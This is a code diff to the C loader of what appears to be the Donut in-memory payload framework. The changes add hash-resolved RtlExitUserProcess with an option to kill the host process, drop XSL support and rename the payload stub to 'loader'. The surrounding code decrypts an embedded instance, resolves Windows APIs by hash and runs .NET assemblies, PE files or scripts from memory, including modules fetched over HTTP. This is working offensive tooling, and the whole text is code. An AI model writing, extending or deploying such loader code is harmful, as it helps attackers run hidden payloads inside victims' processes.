@@ -29,19 +29,20 @@
   OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
 
-#include "payload.h"
+#include "loader.h"
 
 DWORD ThreadProc(LPVOID lpParameter) {
-    ULONG           i, ofs;
-    ULONG64         sig;
-    PDONUT_INSTANCE inst = (PDONUT_INSTANCE)lpParameter;
-    DONUT_ASSEMBLY  assembly;
-    PDONUT_MODULE   mod;
-    VirtualAlloc_t  _VirtualAlloc;
-    VirtualFree_t   _VirtualFree;
-    LPVOID          pv;
-    ULONG64         hash;
-    BOOL            disabled;
+    ULONG                i, ofs;
+    ULONG64              sig;
+    PDONUT_INSTANCE      inst = (PDONUT_INSTANCE)lpParameter;
+    DONUT_ASSEMBLY       assembly;
+    PDONUT_MODULE        mod;
+    VirtualAlloc_t       _VirtualAlloc;
+    VirtualFree_t        _VirtualFree;
+    RtlExitUserProcess_t _RtlExitUserProcess;
+    LPVOID               pv;
+    ULONG64              hash;
+    BOOL                 disabled, term;
     
     DPRINT("Maru IV : %" PRIX64, inst->iv);
     
@@ -50,10 +51,14 @@ DWORD ThreadProc(LPVOID lpParameter) {
     _VirtualAlloc = (VirtualAlloc_t)xGetProcAddress(inst, hash, inst->iv);
     
     hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.VirtualFree) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
-    DPRINT("Resolving address for VirtualAlloc() : %" PRIX64, hash);
+    DPRINT("Resolving address for VirtualFree() : %" PRIX64, hash);
     _VirtualFree  = (VirtualFree_t) xGetProcAddress(inst, hash,  inst->iv);
     
-    if(_VirtualAlloc == NULL || _VirtualFree == NULL) {
+    hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.RtlExitUserProcess) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
+    DPRINT("Resolving address for RtlExitUserProcess() : %" PRIX64, hash);
+    _RtlExitUserProcess  = (RtlExitUserProcess_t) xGetProcAddress(inst, hash,  inst->iv);
+    
+    if(_VirtualAlloc == NULL || _VirtualFree == NULL || _RtlExitUserProcess == NULL) {
       DPRINT("FAILED!.");
       return -1;
     }
@@ -66,6 +71,11 @@ DWORD ThreadProc(LPVOID lpParameter) {
     
     if(pv == NULL) {
       DPRINT("Memory allocation failed...");
+      // terminate host process?
+      if(inst->exit) {
+        DPRINT("Terminating host process");
+        _RtlExitUserProcess(0);
+      }
       return -1;
     }
     DPRINT("Copying %i bytes of data to memory %p", inst->len, pv);
@@ -89,7 +99,7 @@ DWORD ThreadProc(LPVOID lpParameter) {
     
     DPRINT("Generating hash to verify decryption");
     ULONG64 mac = maru(inst->sig, inst->iv);
-    DPRINT("Instance : %016llx | Result : %016llx", inst->mac, mac);
+    DPRINT("Instance : %"PRIX64" | Result : %"PRIX64, inst->mac, mac);
     
     if(mac != inst->mac) {
       DPRINT("Decryption of instance failed");
@@ -147,6 +157,8 @@ DWORD ThreadProc(LPVOID lpParameter) {
         goto erase_memory;
     }
     
+    // perform decompression here
+    
     // unmanaged EXE/DLL?
     if(mod->type == DONUT_MODULE_DLL ||
        mod->type == DONUT_MODULE_EXE) {
@@ -166,10 +178,6 @@ DWORD ThreadProc(LPVOID lpParameter) {
        mod->type == DONUT_MODULE_JS)
     {
       RunScript(inst);
-    } else
-    // xsl?
-    if(mod->type == DONUT_MODULE_XSL) {
-      RunXSL(inst);
     }
     
 erase_memory:
@@ -185,20 +193,34 @@ erase_memory:
       }
     }
     
+    // should we call RtlExitUserProcess?
+    term = (BOOL)inst->exit;
+    
     DPRINT("Erasing RW memory for instance");
     Memset(inst, 0, inst->len);
     
     DPRINT("Releasing RW memory for instance");
     _VirtualFree(inst, 0, MEM_DECOMMIT | MEM_RELEASE);
     
+    if(term) {
+      DPRINT("Terminating host process");
+      // terminate host process
+      _RtlExitUserProcess(0);
+    }
+    DPRINT("Returning to caller");
+    // return to caller, which invokes RtlExitUserThread
     return 0;
+}
+
+int ansi2unicode(PDONUT_INSTANCE inst, CHAR input[], WCHAR output[]) {
+    return inst->api.MultiByteToWideChar(CP_ACP, 0, input, 
+      -1, output, DONUT_MAX_NAME);
 }
 
 #include "http_client.c"     // For downloading module
 
 #include "inmem_dotnet.c"    // .NET assemblies
 #include "inmem_pe.c"        // Unmanaged PE/DLL files
-#include "inmem_xsl.c"       // XSL files
 #include "inmem_script.c"    // VBS/JS files
 
 #include "peb.c"             // resolve functions in export table
@@ -223,7 +245,7 @@ int main(int argc, char *argv[]) {
     DWORD           old;
     
     if(argc != 2) {
-      printf("  [ usage: payload <instance>\n");
+      printf("  [ usage: loader <instance>\n");
       return 0;
     }
     // get size of instance
